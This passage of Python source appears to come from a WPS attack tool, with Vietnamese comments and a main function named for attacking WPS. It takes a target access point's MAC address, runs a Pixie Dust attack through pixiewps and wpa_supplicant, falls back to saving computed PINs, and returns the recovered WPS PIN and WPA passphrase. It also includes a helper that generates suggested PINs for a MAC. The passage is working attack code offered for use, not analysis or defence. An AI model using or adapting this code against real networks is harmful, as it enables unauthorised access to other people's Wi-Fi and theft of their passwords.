                'bssid': bssid,
                'essid': self.connection_status.essid,
                'wps_pin': pin,
                'wpa_psk': self.connection_status.wpa_psk,
                'messages': self.messages
            }
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pin:
                    result = self.single_connection(bssid, pin, pixiemode=False, store_pin_on_fail=True)
                    if isinstance(result, dict):
                        return result
                    return {'success': False, 'error': 'Pixie dust attack failed after PIN found', 'messages': self.messages}
                return {'success': False, 'error': 'Pixie dust attack failed', 'messages': self.messages}
            else:
                self._log('[!] Not enough data to run Pixie Dust attack')
                return {'success': False, 'error': 'Not enough data to run Pixie Dust attack', 'messages': self.messages}
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return {'success': False, 'error': 'Connection failed', 'messages': self.messages}

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        self.cleanup()


def tan_cong_wps(mac: str, interface: str = "wlan0", use_pixie: bool = True, save_result: bool = False) -> dict:
    """
    Hàm tấn công WPS chính
    
    Args:
        mac: Địa chỉ MAC của AP cần tấn công
        interface: Giao diện mạng (mặc định wlan0)
        use_pixie: Sử dụng Pixie Dust attack (mặc định True)
        save_result: Lưu kết quả vào file (mặc định False)
    
    Returns:
        dict: Kết quả tấn công
            - success: bool - Thành công hay không
            - bssid: str - MAC của AP (nếu thành công)
            - essid: str - Tên WiFi (nếu thành công)
            - wps_pin: str - PIN WPS (nếu thành công)
            - wpa_psk: str - Mật khẩu WiFi (nếu thành công)
            - error: str - Thông báo lỗi (nếu thất bại)
            - messages: list - Tất cả các thông báo trong quá trình tấn công
    """
    print(f"[*] Bắt đầu tấn công WPS vào {mac} trên interface {interface}")
    print(f"[*] Sử dụng Pixie Dust: {use_pixie}")
    
    try:
        # Khởi tạo Companion
        companion = Companion(interface, save_result=save_result, print_debug=True)
        
        # Thực hiện tấn công
        result = companion.single_connection(
            bssid=mac,
            pixiemode=use_pixie,
            showpixiecmd=False,
            pixieforce=False,
            store_pin_on_fail=True
        )
        
        # Dọn dẹp
        companion.cleanup()
        
        return result
        
    except Exception as e:
        return {
            'success': False,
            'error': str(e),
            'messages': [f"[!] Lỗi: {str(e)}"]
        }


def get_suggested_pins(mac: str) -> list:
    """Lấy danh sách PIN gợi ý cho một MAC"""
    generator = WPSpin()
    return generator.getSuggestedList(mac)